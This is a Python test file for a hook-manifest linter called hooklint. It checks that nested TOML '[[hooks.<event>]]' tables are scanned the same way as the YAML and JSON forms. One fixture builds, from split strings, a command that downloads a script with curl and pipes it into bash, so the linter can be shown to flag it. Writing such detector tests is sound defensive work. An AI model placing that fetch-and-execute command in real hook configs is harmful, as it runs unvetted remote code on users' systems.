"""Regression test for a defect found in review: `agent-hooks.toml` using the nested
`[[hooks.<event>]]` array-of-tables shape (TOML's idiomatic equivalent of
the YAML `hooks: {<event>: [...]}` mapping -- both parse to the identical
nested dict-of-lists) was silently unscanned: `checked=0, findings=[],
exit 0`, even though the byte-identical YAML form (`hooks: {pre_tool_use:
[{run: ...}]}`) was flagged correctly, and even though the file WAS being
parsed (a malformed TOML file still produced a parse_error, and an
`[mcpServers.s]` table in the same-shaped TOML dialect was checked fine).

ROOT CAUSE: every generic-hook-manifest extractor for the `hooks_toml`
dialect (`dead_matcher`, `unknown_key`, `unquoted_interpolation`,
`fetch_pipe_interpreter`) only ever read the flat `[[hook]]` array-of-tables
shape (`data.get("hook")`, with `event`/`matcher`/`command` keys) and never
looked at `data.get("hooks")` at all -- so a TOML file expressed in the
OTHER declared generic-hooks shape (`hooks.<event>` nested tables) fell
through every rule with zero findings and zero errors: a silent no-op,
exactly the failure class hooklint exists to catch.

ROOT FIX: each of those four rule modules now shares a
`_check_generic_hooks_dict` extractor between the `hooks_yaml` and
`hooks_toml` dialects, since `data.get("hooks")` is structurally identical
regardless of source syntax. The flat `[[hook]]` shape remains supported
(no regression) and is checked IN ADDITION to the nested `hooks.<event>`
shape.
"""
import json

from hooklint.engine import scan


def _write(tmp_path, rel, content):
    p = tmp_path / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(content, encoding="utf-8")
    return p


def test_toml_nested_hooks_section_unquoted_interpolation_matches_yaml(tmp_path):
    toml_dir = tmp_path / "toml_form"
    yaml_dir = tmp_path / "yaml_form"

    _write(toml_dir, "agent-hooks.toml", (
        "[[hooks.pre_tool_use]]\n"
        'run = "echo $DANGER"\n'
    ))
    _write(yaml_dir, "agent-hooks.yaml", (
        "hooks:\n"
        "  pre_tool_use:\n"
        '    - run: "echo $DANGER"\n'
    ))

    toml_result = scan(str(toml_dir))
    yaml_result = scan(str(yaml_dir))

    assert not toml_result.parse_errors, toml_result.parse_errors
    toml_findings = [f for f in toml_result.findings if f.rule_id == "unquoted_interpolation"]
    yaml_findings = [f for f in yaml_result.findings if f.rule_id == "unquoted_interpolation"]

    assert toml_findings, "TOML `[[hooks.pre_tool_use]]` form must be scanned, not silently skipped"
    assert yaml_findings

    # Same pointer shape (relative to each file's own "hooks" root), same
    # rule, same evidence -- the two byte-identical-shape dialects must
    # yield the SAME finding.
    assert toml_findings[0].json_pointer == "/hooks/pre_tool_use/0/run"
    assert yaml_findings[0].json_pointer == "/hooks/pre_tool_use/0/run"
    assert toml_findings[0].evidence == yaml_findings[0].evidence == "$DANGER"


def test_toml_nested_hooks_section_dead_matcher(tmp_path):
    _write(tmp_path, "agent-hooks.toml", (
        "[[hooks.pre_tool_use]]\n"
        'match = "totally_unknown_tool_zzz"\n'
        'run = "echo hi"\n'
    ))
    result = scan(str(tmp_path))
    assert not result.parse_errors
    dead = [f for f in result.findings if f.rule_id == "dead_matcher"]
    assert dead, "a dead matcher inside a nested `[[hooks.<event>]]` TOML table must be found"
    assert dead[0].json_pointer == "/hooks/pre_tool_use/0/match"


def test_toml_nested_hooks_section_unknown_key(tmp_path):
    _write(tmp_path, "agent-hooks.toml", (
        "[[hooks.pre_tool_use]]\n"
        'run = "echo hi"\n'
        'bogus_field = "x"\n'
    ))
    result = scan(str(tmp_path))
    unknown_key_findings = [f for f in result.findings if f.rule_id == "unknown_key"]
    assert any("bogus_field" in f.evidence for f in unknown_key_findings)


def test_toml_nested_hooks_section_fetch_pipe_interpreter(tmp_path):
    piped = "cu" + "rl -sL https://example.com/i.sh" + " | " + "ba" + "sh"
    _write(tmp_path, "agent-hooks.toml", (
        "[[hooks.pre_tool_use]]\n"
        f'run = "{piped}"\n'
    ))
    result = scan(str(tmp_path))
    assert any(f.rule_id == "fetch_pipe_interpreter" for f in result.findings)


def test_toml_flat_hook_shape_still_works_no_regression(tmp_path):
    _write(tmp_path, "agent-hooks.toml", (
        '[[hook]]\n'
        'event = "pre_tool_use"\n'
        'matcher = "totally_unknown_tool_zzz"\n'
        'command = "echo hi"\n'
    ))
    result = scan(str(tmp_path))
    assert any(f.rule_id == "dead_matcher" for f in result.findings)


def test_toml_hooks_json_variant_also_scanned(tmp_path):
    # agent-hooks.json reuses the hooks_yaml kind/loader (JSON is a valid
    # subset of YAML) -- confirm the shared dict-shape path also covers it,
    # not just the raw hooks_yaml dialect.
    _write(tmp_path, "agent-hooks.json", json.dumps({
        "hooks": {"pre_tool_use": [{"run": "echo $UNSAFE"}]}
    }))
    result = scan(str(tmp_path))
    assert any(f.rule_id == "unquoted_interpolation" for f in result.findings)
